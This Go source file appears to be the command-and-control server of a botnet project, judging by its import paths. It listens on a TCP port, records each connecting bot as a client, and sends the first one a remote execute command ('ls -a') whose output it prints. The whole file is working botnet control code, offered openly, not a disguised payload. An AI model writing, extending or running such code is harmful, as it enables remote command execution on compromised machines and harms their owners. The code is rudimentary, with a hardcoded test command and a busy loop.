package client

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strconv"

	"github.com/phanletrunghieu/botnet/common/cmd"

	"github.com/satori/go.uuid"

	"github.com/phanletrunghieu/botnet/server/domain"
)

// Service struct
type Service struct {
	listener net.Listener
	Clients  []*domain.Client
	Error    chan error
}

// NewClientService create tcpService struct
func NewClientService(port int) *Service {
	ln, err := net.Listen("tcp", ":"+strconv.Itoa(port))

	service := &Service{
		listener: ln,
		Error:    make(chan error),
	}

	if err != nil {
		service.Error <- err
	}

	return service
}

// Run wait for a connection
func (s *Service) Run() {
	s.acceptConnection()
}

func (s *Service) acceptConnection() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			s.Error <- err
			continue
		}

		client := &domain.Client{
			ID:   uuid.NewV4(),
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		s.Clients = append(s.Clients, client)

		go s.handleConnection(client)

		log.Println("Clients:", len(s.Clients))
	}
}

func (s *Service) handleConnection(client *domain.Client) {
	for {
		if len(s.Clients) > 0 {
			log.Println(s.Clients)
			conn := s.Clients[0].Conn
			fmt.Fprintf(conn, cmd.Execute+"ls -a\n\r")
			// listen for replies
			msg, err := bufio.NewReader(conn).ReadString('\r')
			if err != nil {
				fmt.Println(err)
				return
			}
			fmt.Print(msg)
			return
		}
	}
}
